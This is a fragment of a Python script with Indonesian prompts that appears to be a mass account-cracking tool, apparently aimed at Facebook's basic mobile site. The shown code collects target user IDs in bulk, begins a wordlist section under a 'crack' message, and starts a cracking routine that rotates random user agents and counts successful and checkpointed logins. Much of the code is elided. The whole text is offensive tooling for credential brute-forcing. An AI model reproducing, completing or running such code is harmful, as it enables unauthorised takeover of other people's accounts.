...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+'└─'+x+'] Masukan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			exit()
	try:
		print(x+' ['+h+'└─'+x+'] Total Dump : \x1b[1;92m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Proses Crack Sabar {m}•{k}•{h}•{x} <<<<< ')
	print('')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[Alip] {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
